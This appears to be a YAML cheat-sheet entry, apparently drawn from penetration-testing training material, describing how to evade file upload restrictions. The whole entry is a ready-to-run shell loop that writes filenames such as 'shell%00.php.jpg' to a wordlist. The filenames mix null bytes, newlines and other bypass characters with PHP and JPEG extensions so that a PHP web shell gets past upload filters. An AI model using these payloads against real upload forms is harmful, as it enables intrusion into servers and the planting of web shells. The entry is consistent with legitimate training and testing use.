---
description: |
  Generate a custom wordlist by combining non-blacklisted and whitelisted file extensions with various bypass characters. 
  This technique helps evade file upload restrictions by using double extensions and special characters.

  Command Reference:

      for ext in '.php' '.phps';

command: |
  for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

items:
  - 
services:
  - 
OS:
  - Linux
  - Mac
attack_types:
  - Enumeration
references:
  - https://academy.hackthebox.com/module/136/section/1289
---
